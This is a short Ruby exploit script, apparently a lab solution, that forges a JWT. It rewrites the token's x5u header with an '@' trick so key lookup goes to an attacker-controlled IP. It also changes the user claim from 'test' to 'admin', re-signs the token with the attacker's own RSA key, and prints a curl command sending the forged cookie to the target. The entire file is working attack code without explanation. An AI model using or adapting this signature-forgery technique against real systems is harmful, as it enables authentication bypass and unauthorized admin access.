require 'openssl'
require 'base64'

token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly9wdGwtNWNjOWI5NjYtODUzYmVmOTQubGliY3VybC5zby8ud2VsbC1rbm93bi9qd2tzX3dpdGhfeDVjLmpzb24ifQ.eyJ1c2VyIjoidGVzdCJ9.aSsf5lcs7VmZ9U1eb2rBMzUe2sD4sRuKo5vEQYDwFsDMKQNCUvgaubZV0qwou7CUB0vbFhmhfMaVxIAAe6L-b2blEIdey3Al4dececN10U9ytMeJOuD6Q-xH1sUujYVhNzscfrhOdwGMtMyan_KefL7oCvWZW1pbg6Ab4CYraxub0vEu5wTdCJq5k-q32An5t90qzaJrCXYNRzrjjckQk5z-kxIKU_9ZlK7e_y7lJmdr7Nr43WEbwpiguOsAy7XfooQd42RAW-CsLrAISnDKFyWHu9gb-Z1VkutDM-55a2cSG0F0p8TAzKiIAgaJVA5WnA_71DuDrpdo0_yjq36JAg'

header, payload, signature = token.split(".")

header = Base64.decode64(header)
payload = Base64.decode64(payload)
payload.gsub!("test", "admin")
header.gsub!("/.well-known", "@220.233.111.125")
# IP 220.233.111.125

priv = OpenSSL::PKey::RSA.new File.read 'private.pem'
pub = priv.public_key
puts header
puts payload
token = Base64.urlsafe_encode64(header).gsub(/=+$/,"") + "." + Base64.urlsafe_encode64(payload).gsub(/=+$/,"")

signature = priv.sign("SHA256", token)
token += "." + Base64.urlsafe_encode64(signature).gsub(/=+$/,"")

puts "curl -H 'Cookie: auth=#{token}' http://ptl-5cc9b966-853bef94.libcurl.so/"
